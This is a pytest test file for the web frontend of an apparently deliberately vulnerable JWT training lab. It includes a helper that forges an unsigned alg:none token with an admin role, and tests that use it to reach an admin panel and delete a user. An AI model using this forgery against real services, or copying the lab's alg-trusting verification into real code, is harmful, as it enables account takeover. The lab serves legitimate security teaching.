"""Browsable web frontend (session-cookie UI over the same vulnerable verify).

These exercise the server-rendered pages against the real lab subprocess:
  - login sets a session cookie and redirects to the dashboard
  - the dashboard renders for a user token; the admin panel 403s for a user
  - a forged admin token reaches the admin panel (the whole point of the lab)
  - deleting carlos flips the server-side "solved" state + shows the banner
  - the token inspector reflects role:user -> role:admin when the cookie is swapped

The existing API + attack tests cover that the vulnerabilities are unchanged; the
frontend only adds a visible skin over them.
"""
import base64
import json

import requests


# ── helpers ───────────────────────────────────────────────────────────────────
def _b64url(obj):
    raw = json.dumps(obj, separators=(",", ":")).encode()
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()


def _forge_admin_none(sub="administrator", role="admin"):
    """An alg:none token the trusts-alg verify accepts — a stand-in for whatever
    tanuki forges in the real demo."""
    return "%s.%s." % (_b64url({"alg": "none", "typ": "JWT"}),
                       _b64url({"sub": sub, "role": role, "iss": "jwt-demo-lab"}))


def _login(base_url):
    """Log in as the demo user; return a Session carrying the session cookie."""
    s = requests.Session()
    r = s.post(base_url + "/login-page",
               data={"username": "wiener", "password": "peter"}, timeout=5)
    r.raise_for_status()
    return s


# ── login ─────────────────────────────────────────────────────────────────────
def test_login_page_renders(base_url):
    r = requests.get(base_url + "/login-page", timeout=5)
    assert r.status_code == 200
    assert "Sign in" in r.text
    assert "name=\"username\"" in r.text


def test_login_sets_cookie_and_redirects(base_url):
    s = requests.Session()
    r = s.post(base_url + "/login-page",
               data={"username": "wiener", "password": "peter"},
               allow_redirects=False, timeout=5)
    assert r.status_code in (301, 302)
    assert r.headers["Location"].endswith("/dashboard")
    assert s.cookies.get("session"), "login did not set a session cookie"


def test_login_rejects_bad_credentials(base_url):
    s = requests.Session()
    r = s.post(base_url + "/login-page",
               data={"username": "wiener", "password": "wrong"}, timeout=5)
    assert r.status_code == 200
    assert "Invalid credentials" in r.text
    assert not s.cookies.get("session")


def test_no_admin_login_exists(base_url):
    # there must be NO valid administrator login — admin only via a forged token
    s = requests.Session()
    r = s.post(base_url + "/login-page",
               data={"username": "administrator", "password": "peter"}, timeout=5)
    assert r.status_code == 200
    assert "Invalid credentials" in r.text
    assert not s.cookies.get("session")


# ── dashboard ─────────────────────────────────────────────────────────────────
def test_dashboard_requires_login(base_url):
    r = requests.get(base_url + "/dashboard", allow_redirects=False, timeout=5)
    assert r.status_code in (301, 302)
    assert r.headers["Location"].endswith("/login-page")


def test_dashboard_renders_for_user(base_url):
    s = _login(base_url)
    r = s.get(base_url + "/dashboard", timeout=5)
    assert r.status_code == 200
    assert "Welcome back, wiener" in r.text
    assert "role-user" in r.text            # inspector + profile show role:user
    assert "role-admin" not in r.text


# ── admin panel gating ─────────────────────────────────────────────────────────
def test_admin_panel_forbidden_for_user(base_url):
    s = _login(base_url)
    r = s.get(base_url + "/admin-panel", timeout=5)
    assert r.status_code == 403
    assert "admin only" in r.text.lower()


def test_admin_panel_ok_for_forged_admin(base_url):
    requests.post(base_url + "/_debug/reset", timeout=5)   # ensure carlos present
    s = requests.Session()
    s.cookies.set("session", _forge_admin_none())
    r = s.get(base_url + "/admin-panel", timeout=5)
    assert r.status_code == 200
    assert "Admin panel" in r.text
    for u in ("wiener", "carlos", "steve", "administrator"):
        assert u in r.text, "admin user list missing %s" % u
    assert "Delete" in r.text


# ── win condition: deleting carlos flips the solved state ───────────────────────
def test_delete_carlos_flips_solved_state(base_url):
    requests.post(base_url + "/_debug/reset", timeout=5)
    s = requests.Session()
    s.cookies.set("session", _forge_admin_none())

    before = s.get(base_url + "/admin-panel", timeout=5)
    assert "LAB SOLVED" not in before.text

    s.post(base_url + "/admin-panel/delete/carlos", timeout=5)

    after = s.get(base_url + "/admin-panel", timeout=5)
    assert "LAB SOLVED" in after.text
    assert requests.get(base_url + "/_debug/state", timeout=5).json()["solved"] is True


def test_user_cannot_delete(base_url):
    requests.post(base_url + "/_debug/reset", timeout=5)
    s = _login(base_url)                      # plain user token
    r = s.post(base_url + "/admin-panel/delete/carlos", timeout=5)
    assert r.status_code == 403
    assert requests.get(base_url + "/_debug/state", timeout=5).json()["solved"] is False


# ── the headline: the inspector shows role:user become role:admin ──────────────
def test_token_inspector_reflects_role_swap(base_url):
    s = _login(base_url)
    user_dash = s.get(base_url + "/dashboard", timeout=5).text
    assert "TOKEN INSPECTOR" in user_dash
    assert "role-user" in user_dash and "role-admin" not in user_dash

    # swap the cookie for a forged admin token (what a cookie editor would do):
    # replace the login cookie rather than add a duplicate alongside it
    s.cookies.clear()
    s.cookies.set("session", _forge_admin_none())
    admin_dash = s.get(base_url + "/dashboard", timeout=5).text
    assert "role-admin" in admin_dash        # inspector now reads role:admin
